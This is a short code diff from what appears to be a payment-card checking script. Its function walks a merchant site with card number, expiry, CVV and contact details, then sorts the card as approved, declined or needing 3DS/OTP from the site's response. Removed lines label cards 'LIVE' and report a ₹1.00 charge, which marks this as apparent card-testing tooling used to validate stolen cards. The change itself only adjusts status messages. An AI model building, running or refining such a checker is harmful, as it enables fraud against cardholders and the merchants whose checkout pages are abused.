@@ -370,12 +370,11 @@ def walk_once(p, args, site, card, mm, yy, cvv, phone, email, name):
             tl = texts[0].lower()
             if any(k in tl for k in ("authenticat", "otp", "3ds", "secure", "verif")):
                 st = "REQUIRES_ACTION"
-                msg = "Card is LIVE — 3DS/OTP authentication required"
             elif any(k in tl for k in ("success", "captured", "paid")):
-                st, msg = "APPROVED", "Charged ₹1.00 (Success)"
+                st = "APPROVED"
             else:
-                st, msg = "DECLINED", texts[0]
-            return {"status": st, "response": msg, "raw": json.dumps(texts)[:1500]}, server_errs
+                st = "DECLINED"
+            return {"status": st, "response": texts[0].strip(), "raw": json.dumps(texts)[:1500]}, server_errs
 
         raise _WalkFail({"status": "SITE_FAIL", "response": "no verdict captured", "site": site,
                          "raw": json.dumps(api_hits[-3:])[:1500] if api_hits else ""})
